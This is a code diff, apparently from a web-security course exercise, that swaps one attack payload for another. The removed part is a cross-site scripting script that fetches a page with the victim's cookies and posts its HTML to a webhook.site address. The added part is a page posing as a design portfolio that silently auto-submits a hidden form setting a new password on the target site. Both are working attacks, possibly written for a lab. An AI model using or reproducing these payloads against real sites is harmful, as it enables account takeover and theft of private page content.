@@ -1,41 +1,32 @@
 
-(async () => {
-    const webhook =
-        "https://webhook.site/04627747-f0d1-4900-a55e-727048b0bf76";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Design Portfolio</title>
+</head>
+<body>
+    <h1>Welcome to my portfolio!</h1>
 
-    const report = (data) => {
-        fetch(webhook, {
-            method: "POST",
-            mode: "no-cors",
-            headers: {
-                "Content-Type": "text/plain"
-            },
-            body: JSON.stringify(data)
-        });
-    };
+    <form
+        id="csrf"
+        action="https://cats.is-course.ru/settings"
+        method="POST"
+    >
+        <input
+            type="hidden"
+            name="password"
+            value="AAAAAAasdf1234_*"
+        >
+        <input
+            type="hidden"
+            name="confirm-password"
+            value="AAAAAAasdf1234_*"
+        >
+    </form>
 
-    report({
-        event: "xss_started",
-        origin: location.origin,
-        url: location.href
-    });
-
-    try {
-        const response = await fetch("/", {
-            credentials: "include"
-        });
-
-        const html = await response.text();
-
-        report({
-            event: "admin_page",
-            status: response.status,
-            html: html
-        });
-    } catch (e) {
-        report({
-            event: "error",
-            message: e.message
-        });
-    }
-})();
+    <script>
+        document.getElementById("csrf").submit();
+    </script>
+</body>
+</html>
